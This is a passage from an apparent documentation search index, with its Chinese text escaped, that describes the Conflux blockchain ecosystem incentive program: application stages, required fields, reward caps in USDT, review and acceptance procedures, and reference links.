\u53c2\u4e0e\u5e76\u652f\u6301\u793e\u533a\u53d1\u5c55 DApp \u751f\u6001\uff1a\u63d0\u9ad8 Conflux \u7f51\u7edc\u4e2d DApp \u7684\u7528\u6237\u4f7f\u7528\u7387\u3001\u6d41\u52a8\u6027\u548c\u53ef\u7ec4\u5408\u6027 DeFi \u751f\u6001\uff1a\u5982\u7a33\u5b9a\u5e01\u3001\u8de8\u94fe\u8d44\u4ea7\u3001\u652f\u4ed8\u6e20\u9053\u3001\u501f\u8d37\u5e73\u53f0\u3001\u5408\u6210\u8d44\u4ea7\uff08\u884d\u751f\u54c1\u3001\u671f\u6743\uff09\u3001DEX \u3001\u505a\u5e02\u5546\u7b49 \u901a\u8bc1\u9879\u76ee\uff0c\u5982\u975e\u7f8e\u5143\u7a33\u5b9a\u5e01\u3001\u8de8\u94fe BTC\u3001ETH \u53ca\u83b7\u9ec4\u91d1\u6258\u7ba1\u4eba\u80cc\u4e66\u7684\u901a\u8bc1 \u5171\u540c\u521b\u5efa NFT \u4e16\u754c\uff0c\u5982\u6e38\u620f\u3001\u827a\u672f\u3001\u6536\u85cf\u54c1\u3001\u97f3\u4e50\u3001\u4e00\u5207\u5929\u9a6c\u884c\u7a7a\u7684\u521b\u610f \u91cd\u65b0\u90e8\u7f72\uff1a\u5c06\u8d44\u4ea7\u8fc1\u79fb\u81f3 Conflux \u7f51\u7edc \u4e3a\u6d4b\u8bd5\u7f51\u53ca\u4e3b\u7f51\u90e8\u7f72\u8fdb\u884c\u6280\u672f\u6574\u5408 \u4fc3\u8fdb\u8de8\u793e\u533a\u5408\u4f5c \u4e3a\u8d44\u4ea7\u8fc1\u79fb\u63d0\u4f9b\u6d41\u52a8\u6027 \u56db\u3001\u751f\u6001\u7533\u8bf7\u6d41\u7a0b \u00b6 \u5728Conflux\u94fe\u4e0a\u5f00\u53d1\u751f\u6001\u9879\u76ee\u7533\u8bf7\u6d41\u7a0b\u5982\u4e0b\uff1a 1\u3001L1\u9636\u6bb5 \u9879\u76ee\u65b9\u9700\u51c6\u5907\u9879\u76ee\u540d\u79f0\u3001\u9879\u76ee\u4ecb\u7ecd\u3001\u5b9e\u73b0\u76ee\u6807\u3001\u65f6\u95f4\u8282\u70b9\u3001\u9879\u76ee\u6210\u679c\u3001\u9879\u76ee\u8fdb\u5ea6\u8ba1\u5212\u3001\u534f\u4f5c\u4eba\u3001\u7533\u8bf7\u4eba\u3001\u56e2\u961f\u80cc\u666f\u3001\u7533\u8bf7\u65f6\u95f4\u3001\u7ecf\u8d39\u660e\u7ec6\u3001\u662f\u5426\u5f00\u6e90\u3001\u6536\u6b3e\u94b1\u5305\u5730\u5740\u3001\u5907\u6ce8\u3001\u8d44\u6599\u94fe\u63a5\u3001\u4ea7\u54c1\u94fe\u63a5\u3001\u9879\u76ee\u7075\u611f\u6765\u6e90\u3001L1\u9636\u6bb5\u9a8c\u6536\u6807\u51c6\u7b49\u8d44\u6599\u3002\u4e4b\u540e\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5e76\u5728\u6b64Conflux\u8bba\u575b\u751f\u6001\u9879\u76ee\u677f\u5757\u4e2d\u53d1\u5e16\u8fdb\u884c\u9879\u76ee\u8d44\u6599\u516c\u793a\u3002\u751f\u6001\u9879\u76ee\u677f\u5757\u5730\u5740\uff1a https://forum.conflux.fun/c/Chinese/Ecology \u3002 2\u3001L2\u9636\u6bb5 \u9879\u76eeLI\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u65b9\u8bbe\u5b9a\u5173\u952e\u6307\u6807\uff0c\u4e4b\u540e\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u8fdb\u884c\u8bc4\u5ba1\uff0c\u516c\u793a\u5468\u671f\u6ee1\u8db37\u65e5\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u5373\u5b89\u6392\u8fdb\u884c\u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u3002 \u7b2c\u4e00\u6b21\u7533\u8bf7\u751f\u6001\u6fc0\u52b1\u65f6\u9700\u8981\u5c06\u9879\u76ee\u4fe1\u606f\u3001\u8054\u7cfb\u65b9\u5f0f\u586b\u5199\u81f3\u95ee\u5377\u4e2d\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u4f1a\u4e0e\u60a8\u53d6\u5f97\u8054\u7cfb\u3002(\u975e\u5e38\u91cd\u8981) \u00b6 \u751f\u6001\u9879\u76ee\u677f\u5757\u5730\u5740\uff1a https://forum.conflux.fun/c/Chinese/Ecology \u3002 \u9879\u76ee\u4fe1\u606f\u95ee\u5377\u94fe\u63a5\uff1a https://wj.qq.com/s2/8502555/95ca/ \u9879\u76ee\u4fe1\u606f\u95ee\u5377\u4e8c\u7ef4\u7801\uff1a \u516c\u793a\u5468\u671f\u6ee1\u8db37\u65e5\uff0c\u8bc4\u5ba1\u5c0f\u7ec4\u5373\u5b89\u6392\u8fdb\u884c\u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u3002 4.1 \u9879\u76ee\u7533\u8bf7\u5e16\u5fc5\u586b\u5185\u5bb9 \u00b6 \uff081\uff09\u9879\u76ee\u540d\u79f0\uff1b \uff082\uff09\u9879\u76ee\u7c7b\u578b\uff08\u5546\u4e1a\u76c8\u5229\u7c7b\u8fd8\u662f\u7814\u7a76\u63a2\u7d22\u7c7b\uff09\uff1b \uff083\uff09\u9879\u76ee\u4ecb\u7ecd\uff1a \uff084\uff09\u5b9e\u73b0\u6210\u679c\uff1a\uff08\u5f53\u524d\u7533\u8bf7\u5185\u5bb9\u6240\u9700\u8981\u5b8c\u6210\u7684\u5185\u5bb9\uff09 \uff085\uff09\u8fdc\u671f\u76ee\u6807\uff1a\uff08\u9879\u76ee\u540e\u671f\u53d1\u5c55\u65b9\u5411\uff0c\u5e95\u5c42\u5efa\u8bbe\u7684\u9879\u76ee\u8bf4\u660e\u4e00\u4e0b\u4ea7\u751f\u4f5c\u7528\u7684\u9886\u57df\u4ee5\u53ca\u65b9\u5411\uff09 \uff086\uff09\u9879\u76ee\u8fdb\u5ea6\u8ba1\u5212:\uff08\u5217\u540d\u8fdb\u5ea6\u5b89\u6392\u4e0e\u65f6\u95f4\u8282\u70b9\uff09 \uff087\uff09\u7533\u8bf7\u4eba\uff1a \uff088\uff09\u7533\u8bf7\u65f6\u95f4\uff1a \uff089\uff09\u56e2\u961f\u80cc\u666f\uff1a \uff0810\uff09\u56e2\u961f\u6784\u6210\u4e0e\u5206\u5de5\uff08\u6ce8\u660e\u5168\u804c/\u517c\u804c\uff09\uff1a \uff0811\uff09\u7ecf\u8d39\u660e\u7ec6\uff1a \uff0812\uff09\u662f\u5426\u5f00\u6e90\uff1a\uff08\u5b8c\u5168\u5f00\u6e90\u3001\u667a\u80fd\u5408\u7ea6\u90e8\u5206\u5f00\u6e90\uff09 \uff0813\uff09\u8d44\u6599\u94fe\u63a5\uff1a(\u5982\u6709) \uff0814\uff09\u4ea7\u54c1\u94fe\u63a5\uff1a(\u5982\u6709) \uff0815\uff09\u9879\u76ee\u7075\u611f\u6765\u6e90\uff1a \uff0816\uff09\u5176\u4ed6\u9700\u8981\u8bf4\u660e\u7684\u60c5\u51b5\uff1a\uff08\u9879\u76ee\u76f8\u5173\u79d1\u666e\u8d44\u6599\uff09 \uff0817\uff09\u9879\u76ee\u7684\u7cbe\u76ca\u753b\u5e03\uff08\u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\u5fc5\u586b\uff0c\u6a21\u677f\u3001\u586b\u5199\u65b9\u6cd5\u89c1\u9644\u5f55\uff09\u3002 \uff0818\uff09\u5708\u5916\u5f15\u6d41\u7684\u8fd0\u8425\u65b9\u6848\u3002 \uff0819\uff09 \u9a8c\u6536\u6307\u6807 4.2 \u9879\u76ee\u987b\u77e5 \u00b6 1\u3001\u4e00\u4e2a\u751f\u6001\u9879\u76eeL1\u9636\u6bb5\u7533\u8bf7\u7684\u6fc0\u52b1\u4e0a\u9650\u4e3a 1.5W USDT \uff08\u7b49\u503cFC\u548cCFX1:1\u53d1\u653e)\uff0c \u9879\u76ee\u65b9\u8d1f\u8d23\u4eba\u5728\u53d1\u5e03\u7533\u8bf7\u8d34\u540e\u9700\u4e3b\u52a8\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u4fbf\u540e\u7eed\u6c9f\u901a\u3002 2\u3001\u4e00\u4e2a\u751f\u6001\u9879\u76eeL2\u9636\u6bb5\u7533\u8bf7\u7684\u6fc0\u52b1\u4e0a\u9650\u4e3a 5W USDT \uff08\u7b49\u503cFC\u548cCFX1:1\u53d1\u653e)\uff0c\u9879\u76ee\u65b9\u8d1f\u8d23\u4eba\u5728L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9700\u4e3b\u52a8\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u4fbf\u540e\u7eed\u6c9f\u901a\u3002 3\u3001\u7533\u8bf7\u901a\u8fc7\u7684\u9879\u76ee\u56e2\u961f\uff0c\u9700\u9636\u6bb5\u6027\u66f4\u65b0\u9879\u76ee\u8fdb\u5ea6\u5230\u5bf9\u5e94\u7684\u751f\u6001\u9879\u76ee\u5e16\u5b50\u5185\u3002 4\u3001\u7533\u8bf7\u901a\u8fc7\u7684\u9879\u76ee\u56e2\u961f\u7533\u8bf7\u4eba\uff0c\u8054\u7cfb\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u8fdb\u5165\u751f\u6001\u9879\u76ee\u5efa\u8bbe\u7fa4\uff0c\u4fbf\u4e8e\u8d44\u6e90\u534f\u8c03\u4e0e\u6c9f\u901a\u3002 5\u3001\u6e38\u620f\u578b\u9879\u76ee\u9700\u4e86\u89e3\u5176\u7ecf\u6d4e\u6a21\u5f0f\u3001\u6e38\u620f\u89c4\u5219\u3001\u673a\u5236\u7b49\uff0c\u5e76\u4e14\u8981\u6ce8\u660e\u8be6\u7ec6\u7684\u53d1\u5e03\u9636\u6bb5\u3002 4.3 \u9879\u76ee\u5206\u7c7b\u6807\u51c6 \u00b6 \uff08\u4e00\uff09\u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\uff08\u6a2a\u5411\uff09 \u00b6 \u6b64\u7c7b\u9879\u76ee\uff0c\u4ee5\u5546\u4e1a\u76c8\u5229\u4e3a\u76ee\u7684\uff0c\u7528\u6237\u91cf\u3001\u9501\u4ed3\u91cf\u3001\u4ea4\u6613\u91cf\u7b49\u6307\u6807\u53ef\u4ee5\u53cd\u6620\u9879\u76ee\u8fd0\u8425\u72b6\u51b5\uff0c\u6b64\u7c7b\u9879\u76ee\u4e00\u822c\u60c5\u51b5\u4e0b\u6280\u672f\u521b\u65b0\u8f83\u5c11\uff0c\u4f46\u4f1a\u5e26\u6765\u8f83\u591a\u751f\u6001\u6536\u76ca\uff0c\u6e38\u620f\u3001defi\u4ea7\u54c1\u90fd\u5728\u6b64\u7c7b\u3002\u7533\u8bf7\u6b64\u7c7b\u9879\u76ee\u9700\u8981\u5728\u7533\u8bf7\u516c\u793a\u5e16\u4e2d\u63d0\u4f9b\u9879\u76ee\u7684\u7cbe\u76ca\u753b\u5e03\uff08\u6a21\u677f\u548c\u586b\u5199\u65b9\u6cd5\u89c1\u9644\u5f55\uff09\u3002 \u9879\u76ee\u4e3e\u4f8b \u00b6 \u6e38\u620f\u7c7b\u9879\u76ee\u4e3e\u4f8b\uff1a \u7f16\u53f7032 Dragon Master\uff08NFT\u8d44\u4ea7Dapp\u6e38\u620f\uff09 defi\u7c7b\u9879\u76ee\u4e3e\u4f8b\uff1a \u7f16\u53f7015 \u53bb\u4e2d\u5fc3\u5316CDS\u4fdd\u9669\uff08Ins3\uff09 \u7f16\u53f7051 Conflux PoolTogether nft\u5e73\u53f0\uff1a \u7f16\u53f7060 \u5b8c\u5168\u5e03\u5c40\u5728CONFLUX\u751f\u6001\u4e0a\u7684CRYPTO ART\u5e73\u53f0\u2014DIONYSOS \u7f16\u53f7005-007 tspace \uff08\u4e8c\uff09\u7814\u7a76\u63a2\u7d22\u7c7b\u9879\u76ee\uff08\u7eb5\u5411\uff09 \u00b6 \u6b64\u7c7b\u9879\u76ee\u66f4\u503e\u5411\u4e8e\u7814\u7a76\u63a2\u7d22\u3001\u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe\uff0c\u77ed\u671f\u5185\u4ea7\u751f\u8d62\u5229\u53ef\u80fd\u6027\u8f83\u4f4e\uff0c\u4f46\u662f\u6280\u672f\u5f00\u6e90\u53ef\u4ee5\u4e3a\u793e\u533a\u5e7f\u5927\u5f00\u53d1\u8005\u63d0\u4f9b\u4fbf\u5229\u3002\u5bf9\u4e8e\u67d0\u4e9b\u5fae\u5c0f\u9886\u57df\u7684\u63a2\u7d22\u4e5f\u4f1a\u6fc0\u8d77\u6574\u4e2a\u6280\u672f\u793e\u533a\u7684\u521b\u65b0\u63a2\u7d22\u6c1b\u56f4\u3001\u5f15\u53d1\u6280\u672f\u793e\u533a\u6210\u5458\u8fdb\u884c\u6c9f\u901a\u4ea4\u6d41\uff0c\u6240\u4ee5\u7533\u8bf7\u6b64\u7c7b\u9879\u76ee\u9700\u8981\u5b8c\u5168\u5f00\u6e90\uff0c\u7533\u8bf7\u3001\u8bc4\u5ba1\u65f6\u9700\u8981\u63d0\u4f9b\u66f4\u4e30\u5bcc\u7684\u6280\u672f\u7ec6\u8282\u3002 \u9879\u76ee\u4e3e\u4f8b \u00b6 \u7f16\u53f7064 \u57fa\u4e8eConflux\u7684\u53bb\u4e2d\u5fc3\u5316\u52a0\u5bc6\u90ae\u4ef6\u7cfb\u7edf \u7f16\u53f7001 .Net Core SDK \u7f16\u53f7042 \u300aMoonGaming\u300bSDK \u7f16\u53f7033 \u6c47\u6d41BPM (Conflux BPM)\uff0c \u4e00\u4e2a\u652f\u6301\u533a\u5757\u94fe\u7684\u4f4e\u4ee3\u7801\u5feb\u901f\u5f00\u53d1\u5e73\u53f0 4.4 \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u6807\u51c6 \u00b6 1\u3001L1\u9636\u6bb5\u4ee5\u9879\u76ee\u8bc4\u5ba1\u4e3a\u4e3b \u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5230\u4f4d7\u540d\u53ca\u4ee5\u4e0a \u6bcf\u9879\u751f\u6001\u9879\u76ee\u6295\u7968\u4e0d\u5f97\u4f4e\u4e8e\u534a\u6570 2\u3001L2\u9636\u6bb5\u4ee5\u5173\u952e\u6307\u6807\u8bbe\u5b9a\u4e3a\u4e3b \u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5230\u4f4d7\u540d\u53ca\u4ee5\u4e0a\u3002 \u6bcf\u9879\u751f\u6001\u9879\u76ee\u6295\u7968\u4e0d\u5f97\u4f4e\u4e8e\u534a\u6570\u3002 \u5404\u9879\u5173\u952e\u6307\u6807\uff0c\u53bb\u6389\u6700\u9ad8\u503c\u548c\u6700\u4f4e\u503c\uff0c\u53d6\u5e73\u5747\u503c\u3002 4.5 \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u4f1a\u8bae\u65f6\u95f4 \u00b6 \u5317\u4eac\u65f6\u95f4\u6bcf\u5468\u65e5\u4e0b\u53482\u70b930\u5206\u3002\uff08\u65e0\u9879\u76ee\u6216\u7279\u6b8a\u60c5\u51b5\u4e0d\u4e3e\u884c\uff09\u3002\u9879\u76ee\u586b\u5199\u516c\u793a\u4e4b\u540e\uff0c\u8bf7\u53ca\u65f6\u901a\u77e5\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\uff0c\u4ee5\u53ca\u9700\u8981\u5728\u5e16\u5b50\u4e2d\u56de\u7b54\u793e\u533a\u6210\u5458\u7684\u5404\u79cd\u95ee\u7b54\u3002 4.6 \u751f\u6001\u9879\u76ee\u53d8\u66f4 \u00b6 \u751f\u6001\u9879\u9879\u76ee\u53d8\u66f4\u91c7\u7528\u4e00\u4e8b\u4e00\u8bae\uff0c\u9879\u76ee\u65b9\u628a\u9700\u8981\u53d8\u66f4\u7684\u90e8\u5206\u8fdb\u884c\u8bf4\u660e\uff0c\u5e76\u9884\u4f30\u5f71\u5f71\u54cd\uff0c\u5c06\u8be6\u7ec6\u4fe1\u606f\u53d1\u5e03\u5230\u7533\u8bf7\u8d34\u4e2d\uff0c\u7531\u8bc4\u5ba1\u5c0f\u7ec4\u6295\u7968\u51b3\u5b9a\u662f\u5426\u901a\u8fc7\u53d8\u66f4\u5e76\u5728\u7533\u8bf7\u8d34\u4e2d\u56de\u590d\u6295\u7968\u7ed3\u679c\u3002 \u9879\u76ee\u65b9\u5728\u7533\u8bf7\u53d8\u66f4\u65f6\u4f1a\u586b\u5185\u5bb9\u9700\u8981\u5305\u62ec\uff1a \u2022 \u53d8\u66f4\u63cf\u8ff0\uff08\u5177\u4f53\u54ea\u4e9b\u9879\u76ee\u8fdb\u884c\u5982\u4f55\u7684\u53d8\u66f4\uff09 \u2022 \u53d8\u66f4\u539f\u56e0 \u2022 \u53d8\u66f4\u5229\u76ca \u2022 \u53d8\u66f4\u6210\u672c \u2022 \u53d8\u66f4\u5e26\u6765\u7684\u5f71\u54cd \u2022 \u652f\u6301\u6027\u6587\u4ef6\uff08\u9009\u586b\uff09 4.7 \u7533\u8bf7\u6fc0\u52b1\u6d41\u7a0b \u00b6 \u9879\u76ee\u5b8c\u7ed3\u6216\u9636\u6bb5\u6027\u5b8c\u7ed3\uff0c\u9879\u76ee\u7533\u8bf7\u4eba\u53ef\u56de\u5e16\u7533\u8bf7\u9a8c\u6536\uff0c\u5e76\u901a\u77e5\u9a8c\u6536\u5c0f\u7ec4\u3002 \u9a8c\u6536\u7533\u8bf7\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a \u2022 \u4e3b\u8981\u5de5\u4f5c\u5b8c\u6210\u60c5\u51b5 \u2022 \u5173\u952e\u6280\u672f\u6307\u6807\u6ee1\u8db3\u60c5\u51b5 \u2022 \u6210\u679c\u5b9e\u73b0\u60c5\u51b5 \u2022 \u7ecf\u8d39\u4f7f\u7528\u60c5\u51b5 \u2022 \u6280\u672f\u6d4b\u8bd5\u60c5\u51b5 \u2022 \u8d44\u6599\u5ba1\u67e5\u60c5\u51b5 \u4e00\u4e9b\u9879\u76ee\u9700\u63d0\u4ea4\u6e90\u4ee3\u7801\u94fe\u63a5\uff0c\u9879\u76ee\u6587\u6863\u7b49\u76f8\u5173\u8d44\u6599\u6253\u5305\u3002 \u9a8c\u6536\u7533\u8bf7\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a\u4e3b\u8981\u5de5\u4f5c\u5b8c\u6210\u60c5\u51b5\u3001\u5173\u952e\u6280\u672f\u6307\u6807\u6ee1\u8db3\u60c5\u51b5\u3001\u6210\u679c\u5b9e\u73b0\u60c5\u51b5\u3001\u7ecf\u8d39\u4f7f\u7528\u60c5\u51b5\u3001\u6280\u672f\u6d4b\u8bd5\u60c5\u51b5\u3001\u8d44\u6599\u5ba1\u67e5\u60c5\u51b5\u7b49\u3002\u9a8c\u6536\u5c0f\u7ec4\u5c06\u7ec4\u7ec7\u6d4b\u8bd5\u4eba\u5458\u8fdb\u884c\u6d4b\u8bd5\u9a8c\u6536\u6253\u5206\uff0c\u5e76\u6839\u636e\u9879\u76ee\u9a8c\u6536\u60c5\u51b5\u8fdb\u884c\u6253\u5206\u3002 \u9a8c\u6536\u901a\u8fc7\u7684\u9879\u76ee\uff0c\u6280\u672f\u59d4\u5458\u4f1a\u4f1a\u901a\u8fc7\u90ae\u4ef6\u5411Conflux\u57fa\u91d1\u4f1a\u63d0\u4ea4\u300a\u9879\u76ee\u9a8c\u6536\u7ed3\u679c\u300b\uff0c\u5e76\u6284\u9001\u5168\u4f53\u59d4\u5458\u4f1a\u6210\u5458\u3002Conflux\u57fa\u91d1\u4f1a\u5ba1\u6838\u540e\uff0c\u5411\u9879\u76ee\u7533\u8bf7\u4eba\u62e8\u4ed8\u7ecf\u8d39\u3002 \u9879\u76ee\u7533\u8bf7\u4eba\u6536\u5230\u7ecf\u8d39\u540e\uff0c\u56de\u5e16\u5df2\u6536\u5230\u5168\u989d\u7ecf\u8d39\uff0c\u4e8e\u7533\u8bf7\u5e16\u6807\u9898\u8ffd\u52a0\u72b6\u6001\uff08\u5df2\u5b8c\u6210\uff09\u5e76\u544a\u77e5\u6280\u672f\u59d4\u5458\u4f1a\uff0c\u9879\u76ee\u5b8c\u6210\u3002 \u4e94\u3001\u751f\u6001\u9879\u76ee\u9080\u8bf7\u4eba\u6fc0\u52b1\u8ba1\u5212 \u00b6 \u63a8\u8350\u4eba\u5728\u63a8\u8350\u7684\u9879\u76eeL1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u65f6\u83b7\u5f97\u9879\u76eeL1\u9636\u6bb5\u91d1\u989d2%\u4f5c\u4e3a\u9879\u76ee\u9080\u8bf7\u6fc0\u52b1\u3002\u5982\u679c\u9879\u76ee\u5b8c\u6210L2\u9636\u6bb5\u9a8c\u6536\uff0c\u9879\u76ee\u9080\u8bf7\u4eba\u53ef\u5728\u5e74\u7ec8\u6280\u672f\u793e\u533a\u8d21\u732e\u7533\u62a5\u65f6\u518d\u6b21\u83b7\u5f97\u66f4\u5927\u6570\u989d\u6fc0\u52b1\u3002 \u9644\u5f55 \u00b6 Conflux\u751f\u6001\u56fe\u8c31 \u00b6 \u7cbe\u76ca\u753b\u5e03\u6a21\u677f\u53ca\u586b\u5199\u6807\u51c6 \u00b6 \u5546\u4e1a\u76c8\u5229\u7c7b\u9879\u76ee\u8bc4\u5ba1\u524d\u987b\u5b8c\u6210\u6b64\u9879\u5185\u5bb9\uff0c\u5982\u679c\u6ca1\u6709\u5236\u4f5c\u5de5\u5177\u76f4\u63a5\u6309\u7167\u8981\u6c42\u5c06\u95ee\u9898\u548c\u7b54\u6848\u6309\u987a\u5e8f\u7f57\u5217\u5230\u7533\u8bf7\u8d34\u4e2d\u5373\u53ef\uff0c\u586b\u5199\u8981\u6c42\u6807\u51c6\u89c1\u53c2\u8003\u6587\u732e\u3002 \u53c2\u8003\u6587\u732e \u00b6 \u300a Conflux\u793e\u533a\u6280\u672f\u59d4\u5458\u4f1a\u7684\u5b97\u65e8 \u300b \u300a Conflux\u751f\u6001\u57fa\u91d1\u7533\u8bf7\u6d41\u7a0b\u8bf4\u660e \u300b \u300a \u751f\u6001\u9879\u76ee\u8bc4\u5ba1\u65b9\u6848(\u53c2\u89c1\u7b2c\u4e09\u8282) \u300b Conflux \u5b98\u7f51\uff1a https://confluxnetwork.org/zh/ Conflux Scan\uff1a https://confluxscan.io/ Conflux Defi\uff1a https://defi.confluxnetwork.org/zh/ Conflux \u751f\u6001\u76ee\u5f55123: https://123cfx.com/ Conflux \u5f00\u53d1\u8d44\u6599\u5305\uff1a https://juejin.cn/post/6940147768535023646 Conflux \u8bba\u575b\uff1a https://forum.conflux.fun/ Conflux Grants: https://confluxnetwork.org/zh/developers/grants \u4ec0\u4e48\u662f\u7cbe\u76ca\u753b\u5e03\uff1a https://zhuanlan.zhihu.com/p/23245402 \u7cbe\u76ca\u753b\u5e03\uff1a \u521b\u4e1a\u516c\u53f8\u8bbe\u8ba1\u5546\u4e1a\u6a21\u5f0f\u7684\u6700\u4f73\u5de5\u5177","title":"\u751f\u6001\u6fc0\u52b1\u6307\u5357"},{"location":"development/incentive-guide/#_1","text":"\u611f\u8c22\u652f\u6301Conflux\u751f\u6001\u5efa\u8bbe\uff0c\u672c\u6587\u5c06\u4f1a\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u751f\u6001\u9879\u76ee\u6fc0\u52b1\u89c4\u5219\u3001\u91d1\u989d\u3001\u6d41\u7a0b\u3001\u9a8c\u6536\u7b49\u95ee\u9898\u8fdb\u884c\u9610\u91ca\u3002 \u672c\u6587\u7531Conflux\u6280\u672f\u793e\u533a\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5171\u540c\u7f16\u7e82\u800c\u6210\uff0c\u5e0c\u671b\u901a\u8fc7\u672c\u89c4\u5219\u66f4\u80fd\u591f\u597d\u7684\u670d\u52a1\u524d\u6765Conflux\u8fdb\u884c\u751f\u6001\u5efa\u8bbe\u7684\u56e2\u961f\u3002 \u672c\u6587\u5c06\u5728\u540e\u7eed\u65bd\u884c\u8fc7\u7a0b\u4e2d\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6301\u7eed\u66f4\u65b0\u8fed\u4ee3\uff0c\u6b22\u8fce\u5404\u4f4d\u670b\u53cb\u968f\u65f6\u63d0\u51fa\u5b9d\u8d35\u610f\u89c1\u3001\u5efa\u8bae\u3002 \u672c\u6587\u6700\u7ec8\u89e3\u91ca\u6743\u5f52Coonflux\u6280\u672f\u793e\u533a\u4ee5\u53caConflux\u57fa\u91d1\u4f1a\u56e2\u961f\u6240\u6709\u3002","title":"\u751f\u6001\u6fc0\u52b1\u6307\u5357"},{"location":"development/incentive-guide/#conflux","text":"Conflux\u751f\u6001\u6276\u6301\u8ba1\u5212\u662f\u751f\u6001\u9879\u76ee\u7684\u5b75\u5316\u5668\uff0c\u4e3aConflux\u94fe\u4e0a\u6709\u6f5c\u529b\u7684\u751f\u6001\u9879\u76ee\u63d0\u4f9b\u5305\u62ec\u5e02\u573a\u3001\u57fa\u7840\u670d\u52a1\u3001\u4fe1\u606f\u670d\u52a1\u3001\u8865\u8d34\u653f\u7b56\u5728\u5185\u7684\u5404\u79cd\u5b75\u5316\u670d\u52a1\uff0c\u5168\u65b9\u4f4d\u652f\u6301\u751f\u6001\u9879\u76ee\u7684\u53d1\u5c55\u4e0e\u63a8\u5e7f\u3002 \u6fc0\u52b1\u539f\u5219 1\u3001\u4f18\u5148\u9f13\u52b1\u63a2\u7d22\u751f\u6001\u56fe\u8c31\u4e0a\u8fd8\u672a\u5f00\u53d1\u7684\u9879\u76ee\u65b9\u5411\uff0c\u5c3d\u91cf\u907f\u514d\u540c\u7c7b\u578b\u9879\u76ee\u624e\u5806\u5185\u5377\uff0c\u4f46\u4e0d\u9650\u5236\u5df2\u6709\u7c7b\u578b\u9879\u76ee\u7533\u8bf7\u3002 2\u3001L1\u9636\u6bb5\u9879\u76ee\u4e3b\u8981\u76ee\u7684\u4e3a\u9a8c\u8bc1\u9879\u76ee\u65b9\u662f\u5426\u5177\u6709\u6301\u7eed\u5f00\u53d1\u8fed\u4ee3\u7684\u80fd\u529b\u548c\u6280\u672f\u6c34\u5e73\uff0cL1 \u9636\u6bb5\u7684\u76ee\u6807\u5e94\u8be5\u662f\u4e00\u4e2a\u7528\u6237\u5df2\u7ecf\u53ef\u4ee5\u4f7f\u7528\u7684demo\uff0c\u539f\u5219\u4e0a\u9700\u8981\u5728\u8bc4\u5ba1\u901a\u8fc7\u540e2\u6708\u5185\u5b8c\u6210\uff0c\u5982\u679c\u65e0\u6cd5\u6309\u671f\u5b8c\u6210\u9700\u8981\u63d0\u524d\u4e00\u5468\u7533\u8bf7\u5e76\u8bf4\u660e\u7406\u7531\u3002 3\u3001L2\u9636\u6bb5\u9879\u76ee\u4e3b\u8981\u76ee\u7684\u4e3a\u9a8c\u8bc1\u9879\u76ee\u65b9\u662f\u5426\u5177\u6709\u5b9e\u73b0\u529f\u80fd\u6027\u6307\u6807\u7684\u80fd\u529b\uff0c\u8003\u5bdf\u5305\u542b\u5176\u56e2\u961f\u6280\u672f\u6c34\u5e73\u53ca\u8fd0\u8425\u6c34\u5e73\u7b49\u7efc\u5408\u80fd\u529b\uff0cL2\u9636\u6bb5\u7684\u76ee\u6807\u5e94\u8be5\u662f\u5b9e\u73b0L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\u8bbe\u5b9a\u7684\u7cfb\u5217\u5173\u952e\u6307\u6807\u548c\u529f\u80fd\uff0c\u539f\u5219\u4e0a\u9700\u8981\u5728\u8bc4\u5ba1\u901a\u8fc7\u540e6\u4e2a\u6708\u5185\u5b8c\u6210\uff0c\u5982\u679c\u65e0\u6cd5\u6309\u671f\u5b8c\u6210\u9700\u8981\u63d0\u524d\u4e00\u5468\u7533\u8bf7\u5e76\u8bf4\u660e\u7406\u7531\u3002 4\u3001L1\u3001L2\u9636\u6bb5\u6fc0\u52b1\u5747\u4e3a\u62a5\u9500\u5236\u3002\u8bc4\u5ba1\u5c0f\u7ec4\u5c06\u4ee5\u5f00\u53d1\u5de5\u4f5c\u91cf\u4f5c\u4e3a\u6fc0\u52b1\u91d1\u989d\u8bc4\u5ba1\u7684\u4f9d\u636e\uff0c\u4f18\u5148\u6fc0\u52b1\u5b8c\u5168\u5f00\u6e90\u9879\u76ee\uff0c\u5bf9\u4e0d\u5f00\u6e90\u9879\u76ee\u51cf\u5c11\u6fc0\u52b1\u91d1\u989d\u5230\u5f00\u6e90\u9879\u76ee\u768460%\u6216\u8bbe\u5b9a\u8fd0\u8425\u7c7b\u7684\u6307\u6807\uff0c\u670d\u52a1\u5668\u7b49\u6210\u672c\u6700\u591a\u627f\u62c5\u534a\u5e74\u3002 5\u3001\u5305\u542bIDO\u7b49\u56fd\u5185\u6cd5\u5f8b\u4e0d\u5141\u8bb8\u5185\u5bb9\u7684\u9879\u76ee\uff0c\u8bf7\u76f4\u63a5\u4ece\u6d77\u5916grants\u7533\u8bf7\u3002 6\u3001\u53d1\u653e\u6fc0\u52b1\u7684\u76ee\u7684\u662f\u4e3a\u4e86kick 